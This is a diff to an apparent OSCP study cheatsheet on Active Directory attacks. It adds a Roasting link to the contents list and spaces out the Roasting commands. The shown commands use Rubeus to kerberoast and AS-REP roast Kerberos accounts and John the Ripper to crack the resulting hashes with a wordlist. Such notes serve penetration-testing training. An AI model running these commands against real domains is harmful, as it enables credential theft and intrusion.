@@ -1,6 +1,6 @@
   - [Kerbrute]
   - [Rubeus]
-  - [Roasting]
+  - [Roasting](https://github.com/conma293/OSCP-tools/blob/master/cheatsheets/BasicAD.md#roasting)
   - [Mimikatz](https://github.com/conma293/OSCP-tools/blob/master/cheatsheets/BasicAD.md#mimikatz)
   - [Lateral Movement](https://github.com/conma293/OSCP-tools/blob/master/cheatsheets/BasicAD.md#lateral-movement)
 
@@ -21,9 +21,11 @@
 # Roasting
 
 ```Rubeus.exe kerberoast /nowrap```
+
 ```Rubeus.exe asreproast /nowrap```
 
 ```john hash.txt```
+
 ```john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt```
 
 ```--format=krb5tgs```
